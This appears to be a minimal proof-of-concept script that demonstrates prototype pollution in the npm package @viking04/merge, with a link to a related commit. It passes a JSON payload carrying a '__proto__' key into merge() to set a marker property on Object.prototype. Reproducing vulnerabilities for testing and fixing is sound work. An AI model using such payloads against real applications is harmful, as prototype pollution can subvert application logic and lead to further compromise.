//https://github.com/viking04/merge/commit/baba40332080b38b33840d2614df6d4142dedaf6
 
  const merge = require("@viking04/merge");
   

  let a = {};

  var prototype_pollution_test = JSON.parse('{"__proto__":{"polluted":"yes"}}');

  merge(a, prototype_pollution_test);

// End of file
